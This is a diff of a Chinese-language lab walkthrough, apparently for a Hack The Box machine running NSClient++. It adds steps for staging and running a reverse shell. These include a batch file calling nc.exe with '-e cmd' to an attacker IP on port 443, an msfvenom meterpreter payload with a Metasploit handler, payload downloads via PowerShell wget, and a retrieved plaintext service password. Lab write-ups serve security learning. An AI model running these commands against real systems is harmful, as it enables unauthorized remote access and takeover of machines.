@@ -629,7 +629,7 @@ tcp   LISTEN 0      128                                            [::1]:8443   
 #### 通过在web控制台中输入脚本的别名，我们可以手动执行负载。
 ```
 [★]$ wget https://github.com/vinsworldcom/NetCat64/releases/download/1.11.6.4/nc64.exe
-[★]$ echo '\programdata\nc.exe 10.10.14.134 443 -e cmd.exe' > shell.bat
+[★]$ echo '\programdata\nc.exe 10.10.14.134 443 -e cmd' > shell.bat
 [★]$ python3 -m http.server 8011
 Serving HTTP on 0.0.0.0 port 8011 (http://0.0.0.0:8011/) ...
 
@@ -942,6 +942,8 @@ _____________
 ```
 PS C:\programdata> powershell wget http://10.10.15.27:8011/rev.exe -outfile rev.
 exe
+PS C:\programdata> powershell wget http://10.10.15.27:8011/shell.bat -outfile sh
+ell.bat
 PS C:\programdata> dir
 
 
@@ -960,11 +962,81 @@ d-----        2/25/2025   5:46 AM                ssh
 d-----        9/15/2018  12:19 AM                USOPrivate
 d-----       11/11/2019   6:52 PM                USOShared
 d-----        2/28/2022   5:44 PM                VMware
--a----        2/13/2026   1:34 AM          55296 nc.exe
--a----        2/13/2026   1:35 AM           7168 rev.exe
-
-
-PS C:\programdata>
+-a----        2/13/2026   4:35 AM           7168 rev.exe
+-a----        2/13/2026   5:07 AM             23 shell.bat
 
 ```
 #### 应该使用443端口
+```
+[★]$ echo 'C:\programdata\rev.exe' > shell.bat
+[★]$ cat shell.bat
+C:\programdata\rev.exe
+
+[★]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.27 LPORT=443 -f exe -o rev.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of exe file: 7168 bytes
+Saved as: rev.exe
+[★]$ python3 -m http.server 8011
+Serving HTTP on 0.0.0.0 port 8011 (http://0.0.0.0:8011/) ...
+
+sudo msfconsole
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 10.10.15.27
+set LPORT 443
+run
+```
+______________
+
+换kali
+```
+┌──(parallels㉿kali-linux-2024-2)-[~]
+└─$ vi shell.bat
+┌──(parallels㉿kali-linux-2024-2)-[~]
+└─$ cat shell.bat
+\programdata\nc.exe 10.10.15.27 443 -e cmd
+┌──(parallels㉿kali-linux-2024-2)-[~]
+└─$ python3 -m http.server 8011
+Serving HTTP on 0.0.0.0 port 8011 (http://0.0.0.0:8011/) ...
+
+
+```
+```
+nadine@SERVMON C:\Program Files\NSClient++>nscp web -- password --display
+Current password: ew2x6SsGTxjRwXOT
+
+nadine@SERVMON C:\>powershell
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+PS C:\programdata> powershell wget http://10.10.15.27:8011/shell.bat -outfile shell.bat
+PS C:\programdata> powershell wget http://10.10.15.27:8011/nc64.exe -outfile nc.exe
+PS C:\programdata> dir
+
+
+    Directory: C:\programdata
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        2/28/2022   6:32 PM                chocolatey
+d---s-        2/28/2022   3:55 PM                Microsoft
+d-----        2/28/2022   6:46 PM                NVMS-1000
+d-----        2/28/2022   6:24 PM                Package Cache
+d-----        2/25/2025   5:39 AM                regid.1991-06.com.microsoft
+d-----        9/15/2018  12:19 AM                SoftwareDistribution
+d-----        2/25/2025   5:46 AM                ssh
+d-----        9/15/2018  12:19 AM                USOPrivate
+d-----       11/11/2019   6:52 PM                USOShared
+d-----        2/28/2022   5:44 PM                VMware
+-a----        2/13/2026   5:34 AM          45272 nc.exe
+-a----        2/13/2026   5:34 AM             43 shell.bat
+
+
+PS C:\programdata>  
+
+
+```
+
